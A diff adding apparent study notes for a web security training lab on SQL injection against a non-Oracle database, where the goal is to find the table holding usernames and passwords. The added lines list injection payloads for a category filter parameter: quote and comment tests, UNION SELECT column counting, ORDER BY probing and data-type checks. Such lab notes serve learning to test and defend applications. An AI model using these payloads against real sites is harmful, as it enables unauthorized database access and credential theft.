@@ -56,3 +56,16 @@ Lab5: SQL injection attack, listing the database contents on non-Oracle database
 Given : DB contains a table that holds usernames and passwords columns .
 
 Q.      You need to determine the name of this table 
+
+Ans  : GET /filter?category='
+       GET /filter?category='--+
+
+     - No of Columns
+       ' union select null --+ Error
+       ' union select null,null --+ 
+
+       ' order by 1--+
+       ' order by 2--+
+       ' order by 3--+ Error
+     - Data Type
+       ' union select 'ABC','DEF' --+
